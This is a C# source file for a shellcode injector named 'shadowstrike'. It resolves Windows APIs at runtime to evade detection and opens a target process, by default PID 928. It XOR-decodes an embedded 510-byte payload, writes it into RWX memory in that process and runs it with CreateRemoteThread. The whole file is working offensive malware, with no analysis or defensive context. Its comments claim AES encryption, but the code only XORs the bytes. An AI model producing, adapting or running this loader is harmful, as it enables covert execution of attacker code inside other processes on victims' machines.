using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ComponentModel;

namespace shadowstrike
{
    class Program
    {
        // Delegates for dynamic API resolution
        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate bool IsDebuggerPresentDelegate();
        private delegate void SleepDelegate(uint dwMilliseconds);

        static void Main(string[] args)
        {
            try
            {
                // Get target PID from arguments or use default
                int targetPid = args.Length > 0 ? int.Parse(args[0]) : 928;

                // Dynamic API resolution
                var openProcess = GetApiDelegate<OpenProcessDelegate>("kernel32.dll", "OpenProcess");
                var virtualAllocEx = GetApiDelegate<VirtualAllocExDelegate>("kernel32.dll", "VirtualAllocEx");
                var writeProcessMemory = GetApiDelegate<WriteProcessMemoryDelegate>("kernel32.dll", "WriteProcessMemory");
                var createRemoteThread = GetApiDelegate<CreateRemoteThreadDelegate>("kernel32.dll", "CreateRemoteThread");

                // Open target process
                IntPtr hProcess = openProcess(0x001F0FFF, false, targetPid);
                if (hProcess == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // Allocate memory in remote process
                IntPtr addr = virtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                if (addr == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // Encrypted Shellcode Data
                // Original length: 510 bytes

                // AES Key

                // Encrypted Shellcode
                byte[] buf = new byte[510] { 0xFE, 0x4A, 0x81, 0xE6, 0xF2, 0xEA, 0xCE, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x50, 0x53, 0x4A, 0x33, 0xD0, 0x67, 0x4A, 0x89, 0x50, 0x62, 0x4A, 0x89, 0x50, 0x1A, 0x54, 0x4A, 0x89, 0x50, 0x22, 0x4A, 0x0D, 0xB5, 0x48, 0x48, 0x4F, 0x33, 0xCB, 0x4A, 0x89, 0x70, 0x52, 0x4A, 0x33, 0xC2, 0xAE, 0x3E, 0x63, 0x7E, 0x00, 0x2E, 0x22, 0x43, 0xC3, 0xCB, 0x0F, 0x43, 0x03, 0xC3, 0xE0, 0xEF, 0x50, 0x4A, 0x89, 0x50, 0x22, 0x89, 0x40, 0x3E, 0x4A, 0x03, 0xD2, 0x43, 0x53, 0x64, 0x83, 0x7A, 0x1A, 0x09, 0x00, 0x0D, 0x87, 0x70, 0x02, 0x02, 0x02, 0x89, 0x82, 0x8A, 0x02, 0x02, 0x02, 0x4A, 0x87, 0xC2, 0x76, 0x65, 0x4A, 0x03, 0xD2, 0x89, 0x4A, 0x1A, 0x46, 0x89, 0x42, 0x22, 0x52, 0x4B, 0x03, 0xD2, 0xE1, 0x54, 0x4F, 0x33, 0xCB, 0x4A, 0xFD, 0xCB, 0x43, 0x89, 0x36, 0x8A, 0x4A, 0x03, 0xD4, 0x4A, 0x33, 0xC2, 0xAE, 0x43, 0xC3, 0xCB, 0x0F, 0x43, 0x03, 0xC3, 0x3A, 0xE2, 0x77, 0xF3, 0x4E, 0x01, 0x4E, 0x26, 0x0A, 0x47, 0x3B, 0xD3, 0x77, 0xDA, 0x5A, 0x46, 0x89, 0x42, 0x26, 0x4B, 0x03, 0xD2, 0x64, 0x43, 0x89, 0x0E, 0x4A, 0x46, 0x89, 0x42, 0x1E, 0x4B, 0x03, 0xD2, 0x43, 0x89, 0x06, 0x8A, 0x43, 0x5A, 0x43, 0x5A, 0x5C, 0x4A, 0x03, 0xD2, 0x5B, 0x58, 0x43, 0x5A, 0x43, 0x5B, 0x43, 0x58, 0x4A, 0x81, 0xEE, 0x22, 0x43, 0x50, 0xFD, 0xE2, 0x5A, 0x43, 0x5B, 0x58, 0x4A, 0x89, 0x10, 0xEB, 0x49, 0xFD, 0xFD, 0xFD, 0x5F, 0x4B, 0xBC, 0x75, 0x71, 0x30, 0x5D, 0x31, 0x30, 0x02, 0x02, 0x43, 0x54, 0x4B, 0x8B, 0xE4, 0x4A, 0x83, 0xEE, 0xA2, 0x03, 0x02, 0x02, 0x4B, 0x8B, 0xE7, 0x4B, 0xBE, 0x00, 0x02, 0x03, 0xB9, 0xC2, 0xAA, 0x2F, 0xE0, 0x43, 0x56, 0x4B, 0x8B, 0xE6, 0x4E, 0x8B, 0xF3, 0x43, 0xB8, 0x4E, 0x75, 0x24, 0x05, 0xFD, 0xD7, 0x4E, 0x8B, 0xE8, 0x6A, 0x03, 0x03, 0x02, 0x02, 0x5B, 0x43, 0xB8, 0x2B, 0x82, 0x69, 0x02, 0xFD, 0xD7, 0x68, 0x08, 0x43, 0x5C, 0x52, 0x52, 0x4F, 0x33, 0xCB, 0x4F, 0x33, 0xC2, 0x4A, 0xFD, 0xC2, 0x4A, 0x8B, 0xC0, 0x4A, 0xFD, 0xC2, 0x4A, 0x8B, 0xC3, 0x43, 0xB8, 0xE8, 0x0D, 0xDD, 0xE2, 0xFD, 0xD7, 0x4A, 0x8B, 0xC5, 0x68, 0x12, 0x43, 0x5A, 0x4E, 0x8B, 0xE0, 0x4A, 0x8B, 0xFB, 0x43, 0xB8, 0x9B, 0xA7, 0x76, 0x63, 0xFD, 0xD7, 0x87, 0xC2, 0x76, 0x08, 0x4B, 0xFD, 0xCC, 0x77, 0xE7, 0xEA, 0x91, 0x02, 0x02, 0x02, 0x4A, 0x81, 0xEE, 0x12, 0x4A, 0x8B, 0xE0, 0x4F, 0x33, 0xCB, 0x68, 0x06, 0x43, 0x5A, 0x4A, 0x8B, 0xFB, 0x43, 0xB8, 0x00, 0xDB, 0xCA, 0x5D, 0xFD, 0xD7, 0x81, 0xFA, 0x02, 0x7C, 0x57, 0x4A, 0x81, 0xC6, 0x22, 0x5C, 0x8B, 0xF4, 0x68, 0x42, 0x43, 0x5B, 0x6A, 0x02, 0x12, 0x02, 0x02, 0x43, 0x5A, 0x4A, 0x8B, 0xF0, 0x4A, 0x33, 0xCB, 0x43, 0xB8, 0x5A, 0xA6, 0x51, 0xE7, 0xFD, 0xD7, 0x4A, 0x8B, 0xC1, 0x4B, 0x8B, 0xC5, 0x4F, 0x33, 0xCB, 0x4B, 0x8B, 0xF2, 0x4A, 0x8B, 0xD8, 0x4A, 0x8B, 0xFB, 0x43, 0xB8, 0x00, 0xDB, 0xCA, 0x5D, 0xFD, 0xD7, 0x81, 0xFA, 0x02, 0x7F, 0x2A, 0x5A, 0x43, 0x55, 0x5B, 0x6A, 0x02, 0x42, 0x02, 0x02, 0x43, 0x5A, 0x68, 0x02, 0x58, 0x43, 0xB8, 0x09, 0x2D, 0x0D, 0x32, 0xFD, 0xD7, 0x55, 0x5B, 0x43, 0xB8, 0x77, 0x6C, 0x4F, 0x63, 0xFD, 0xD7, 0x4B, 0xFD, 0xCC, 0xEB, 0x3E, 0xFD, 0xFD, 0xFD, 0x4A, 0x03, 0xC1, 0x4A, 0x2B, 0xC4, 0x4A, 0x87, 0xF4, 0x77, 0xB6, 0x43, 0xFD, 0xE5, 0x5A, 0x68, 0x02, 0x5B, 0x4B, 0xC5, 0xC0, 0xF2, 0xB7, 0xA0, 0x54, 0xFD, 0xD7 };

                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ 2);
                }

                // Write shellcode to remote process
                IntPtr outSize;
                bool success = writeProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                if (!success)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // Create remote thread
                IntPtr hThread = createRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
            }
        }

        private static T GetApiDelegate<T>(string module, string function) where T : Delegate
        {
            IntPtr moduleHandle = GetModuleHandle(module);
            if (moduleHandle == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            IntPtr functionAddress = GetProcAddress(moduleHandle, function);
            if (functionAddress == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            return (T)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(T));
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}